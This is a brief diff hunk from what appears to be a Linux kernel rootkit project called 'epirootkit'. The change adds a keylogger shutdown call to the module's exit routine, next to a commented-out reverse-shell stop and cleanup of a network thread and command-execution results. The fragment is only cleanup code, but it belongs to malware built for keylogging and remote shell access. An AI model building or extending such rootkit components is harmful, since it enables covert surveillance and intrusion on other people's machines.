@@ -74,6 +74,9 @@ static int __init epirootkit_init(void)
 static void __exit epirootkit_exit(void){
 	// stop_reverse_shell();
 
+	// stop keylogger
+	epikeylog_exit();
+
 	free_exec_result();
 
 	if (network_thread) {
